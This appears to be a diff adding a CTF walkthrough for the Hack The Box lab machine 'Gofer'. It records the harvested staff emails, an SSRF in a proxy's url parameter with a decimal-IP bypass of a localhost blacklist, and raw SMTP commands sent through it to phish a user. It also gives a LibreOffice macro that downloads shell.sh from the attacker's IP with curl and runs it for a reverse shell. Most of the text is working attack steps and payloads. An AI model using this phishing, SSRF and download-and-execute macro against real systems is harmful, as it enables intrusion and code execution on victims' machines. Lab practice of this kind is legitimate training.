@@ -1,0 +1,79 @@
+SMB showed a email {
+
+  jdavis@gofer.htb
+  tbuckley@gofer.htb
+  jhudson@gofer.htb --> Vector?
+  bamanda@gofer.htb
+  info@gofer.htb
+  
+  "Jocelyn received phishing attempt last week and his habit of clicking on links without paying much attention"
+  "If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice."
+  "I know you're working on our web proxy but if you could restrict access"
+}
+
+Contact Section of the gofer.htb is not set up so this cannot be possibly exploited!
+
+swaks --to hjocelyn@gofer.htb --from ender@root.htb --server 10.10.11.225 --body "http://10.10.14.41:80/index.html" --header "Subject: Click Me!" --> send an email using swaks
+
+Attempting to use swaks is failing due to Connection Timeout!
+
+The email talked about a proxy, wfuzz shoes a proxy.gofer.htb domain! ==> Unauthorized
+
+Sending a modified request to proxy.gofer.htb we can discover important information!
+  All websites and domains have index.* we can play around changing it to .html .php .aspx etc
+  We also can modify the Req Type to POST, and if we send a POST to index.php we get told
+  Missing URL Parameter! ==> POST /index.php?url=http://10.10.14.41:80/index.html
+
+We have an SSRF from the POST Req!
+  1.) https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2
+  2.) OfficeLibre Phish Attack can be attempted (.odt)
+  3.) https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/libreoffice_macro_exec.md --> file:///tmp/libreoffice_macro_exec_doc20230812-41178-qiei7s.html [payload debug]
+  4.) https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher
+
+Because there is black-listing for 127, localhost, etc: we can bypass by
+https://dnschecker.org/ip-to-decimal.php ==> Converting IPv4 to Decimal
+
+HELO 2130706433
+MAIL FROM:jdavis@gofer.htb
+RCPT TO:tbuckley@gofer.htb
+QUIT
+
+===============
+
+HELO 2130706433
+MAIL FROM:jdavis@gofer.htb
+RCPT TO:jhudson@gofer.htb
+DATA
+Date: Sat, 12, Aug 2023 17:20:26 -0400
+From: jdavis <jdavis@gofer.htb>
+Subject Important
+To: jhudson@gofer.htb
+http://10.10.14.41:80/librefile.odt
+/jdavis
+.
+QUIT
+
+===============
+
+After URL-Encoding the payload twice and compressing it into a 1-liner
+You can send phishing emails to jhudson@gofer.htb!
+
+In order to make a proper boobytrap .odt file we need to use the LibreOffice Application
+Going through we can go into Tools > Macros > Edit Macros, We can add our own custom Macros
+Written in Visual Basic
+
+VB Code ---------
+
+Sub Main
+	Shell("curl http://10.10.14.41:80/shell.sh -o /tmp/shell.sh")
+	Shell("chmod +x /tmp/shell.sh")
+	Shell("bash /tmp/shell.sh")
+End Sub
+
+-----------------
+
+After building the libreFile.odt we can now send a phishing email to the target email
+and then we will see a hit on libreFile -> shell.sh -> nc shell recieved
+
+user:c4c71bdd907668fdc598d137da6c869d
+=====================================
